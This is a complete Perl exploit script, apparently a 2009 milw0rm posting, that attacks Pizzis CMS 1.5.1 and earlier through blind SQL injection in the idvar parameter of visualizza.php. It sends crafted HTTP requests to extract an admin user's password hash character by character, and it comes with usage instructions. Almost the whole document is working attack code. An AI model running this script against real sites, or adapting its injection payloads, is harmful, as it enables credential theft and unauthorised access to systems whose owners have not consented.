--+++=============================================================+++--
--+++====== Pizzis CMS <= 1.5.1 Blind SQL Injection Exploit ======+++--
--+++=============================================================+++--


#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket;

sub usage {
   die
       "\n[+] Pizzis CMS <= 1.5.1 Blind SQL Injection Exploit".
       "\n[+] Author: darkjoker".
       "\n[+] Site  : http://darkjoker.net23.net".
       "\n[+] Usage : perl $0 <hostname> <path> <username>".
       "\n[+] Ex.   : perl $0 localhost /pizziscms admin".
       "\n[+] Greetz: my girlfriend, she has no idea about what is it <3".
       "\n\n";
}

sub query {
   my ($user, $chr, $pos) = @_;
   my $query = "98765 OR ASCII(SUBSTRING((SELECT pass FROM pizziscms_admin WHERE user  = '${user}'),${pos},1))=${chr}";
   $query =~ s/ /%20/g;
   $query =~ s/'/%27/g;
   return $query;
}

sub exploit {
   my ($hostname, $path, $user, $chr, $pos) = @_;
   $chr = ord ($chr);

   my $sock = new IO::Socket::INET (
       PeerHost => $hostname,
       PeerPort => 80,
       Proto    => "tcp",
   ) or die $!;

   my $query = query ($user, $chr, $pos);
   my $request = "GET ${path}/visualizza.php?idvar=${query} HTTP/1.1\r\n".
             "Host: ${hostname}\r\n".
             "Connection: Close\r\n\r\n";

   print $sock $request;

   my $reply;
   while (<$sock>)
   {
       $reply .= $_;

   }
   close ($sock);

   $reply =~ s/\s/ /g;

   $reply =~ /<h4>(.+)\/h4>/;
      if (length ($1) > 1)
   {
       return 1;
   }
   else
   {
       return 0;
   }
}

if (scalar (@ARGV) != 3)
{
   usage ();
}

my ($hostname, $path, $user) = @ARGV;

my @key = split ('', 'abcdefghijklmnopqrstuvwxyz0123456789');
my $pos = 1;
my $chr = 0;

print "[+] Password: ";
while ($pos <= 32)
{
   if (exploit ($hostname, $path, $user, $key [$chr], $pos))
   {
       print $key [$chr];
       $chr = -1;
       $pos++;
   }
   $chr++;
}

print "\n";

# milw0rm.com [2009-01-08]
